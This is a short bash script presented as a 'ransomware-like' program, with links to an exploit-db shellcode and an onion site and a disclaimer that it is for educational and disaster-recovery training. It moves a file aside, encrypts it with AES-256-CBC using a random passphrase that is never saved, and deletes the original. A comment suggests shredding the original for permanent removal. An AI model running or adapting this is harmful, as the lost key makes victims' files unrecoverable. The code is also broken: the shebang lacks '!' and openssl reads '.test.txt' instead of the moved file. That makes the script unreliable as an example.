#/bin/bash

#    Ransomware-like program for encrypting specific files with aes-256-cbc and sets a random 32 character passphrase. Created by Social Engineering Neo.
#    Program based off striders shellcode.
#    Strictly educational use only - Useful for disaster recovery training
#    Check out: - https://exploit-db.com/shellcodes/46791
#             : - http://mvfjfugdwgc5uwho.onion/exploit/description/32653
#
#    The latest version of Autopsy can be found @ https://autopsy.com/download
#
#    1) Create file named "encrypt_me" and input text.
#    2) Run ransomware.sh in same directory as encrypt_me.

mv encrypt_me .encrypt_me && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out encrypt_me -k - && rm .encrypt_me    #Replace `rm .encrypt_me` with `shred -zu  .encrypt_me &>/dev/null` for permanent removal.
echo File encrypt_me was encrypted successfully.